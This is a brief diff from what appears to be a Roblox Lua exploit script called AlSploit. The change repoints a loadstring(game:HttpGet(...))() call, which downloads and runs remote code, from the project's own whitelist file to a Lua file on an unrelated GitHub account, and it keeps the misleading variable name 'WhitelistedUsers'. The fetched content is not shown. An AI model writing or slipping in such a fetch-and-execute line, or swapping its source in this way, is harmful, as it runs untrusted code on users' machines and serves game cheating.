@@ -1,4 +1,4 @@
-local WhitelistedUsers = loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/AlSploit/main/Whitelist"))()
+local WhitelistedUsers = loadstring(game:HttpGet("https://raw.githubusercontent.com/tangxianchun/550fx/main/BMD.lua"))()
 local Owner = "AlSploitRevamped"
 
 local LocalPlayer = game.Players.LocalPlayer
